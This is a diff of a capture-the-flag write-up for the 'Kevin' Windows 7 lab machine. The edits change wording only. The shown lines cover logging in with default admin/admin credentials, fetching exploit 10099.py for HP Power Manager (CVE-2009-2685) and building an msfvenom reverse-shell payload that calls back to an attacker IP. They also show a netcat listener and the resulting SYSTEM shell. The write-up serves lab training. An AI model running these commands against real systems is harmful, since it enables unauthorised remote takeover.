@@ -1,6 +1,6 @@
 # Kevin - Windows 7 Exploitation Walkthrough
 
-This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The objective was to gain full SYSTEM-level access by exploiting a vulnerable web application and capturing the administrator flag.
+This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The objective was to gain SYSTEM-level access by exploiting a vulnerable web application and capturing the administrator flag.
 
 ---
 
@@ -37,11 +37,10 @@ Observed HP Power Manager login page.
 
 Default credentials used:
 
-pgsql
-Copy
-Edit
 Username: admin
+
 Password: admin
+
 Exploitation - HP Power Manager RCE
 Searched for known exploits using Searchsploit:
 
@@ -50,10 +49,10 @@ Copy
 Edit
 searchsploit HP Power Manager
 searchsploit -m 10099.py
-Confirmed vulnerability: CVE-2009-2685 — Remote Code Execution.
+Confirmed vulnerability: CVE-2009-2685 — Remote Code Execution via formExportData.php.
 
 Reverse Shell Payload
-Generated a custom reverse shell using msfvenom:
+Generated a reverse shell payload using msfvenom:
 
 bash
 Copy
@@ -61,29 +60,29 @@ Edit
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=80 \
 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
 -e x86/alpha_mixed -f c
-Payload was inserted into the SHELL variable in 10099.py.
+Inserted the payload into the SHELL variable inside the 10099.py exploit script.
 
-Exploit Execution & Shell Access
-Started listener:
+Gaining Shell Access
+Started a Netcat listener:
 
 bash
 Copy
 Edit
 rlwrap nc -nlvp 80
-Executed exploit:
+Executed the exploit:
 
 bash
 Copy
 Edit
 python2.7 10099.py 192.168.232.45
-Gained shell access as:
+Received a reverse shell as:
 
 sql
 Copy
 Edit
 NT AUTHORITY\SYSTEM
 Captured Flag
-Located in:
+Navigated to:
 
 makefile
 Copy
@@ -109,14 +108,15 @@ netcat (nc)
 rlwrap
 
 Summary
-Performed recon and discovered exposed web service
+Performed reconnaissance to discover running services
 
-Identified and exploited RCE vulnerability (CVE-2009-2685)
+Logged into HP Power Manager using default credentials
 
-Gained SYSTEM-level access via reverse shell
+Exploited RCE vulnerability (CVE-2009-2685)
 
-Retrieved administrator flag
+Gained SYSTEM-level reverse shell
+
+Captured the final flag from Administrator’s desktop
 
 Author
 Farhanahmad Quraishi
-
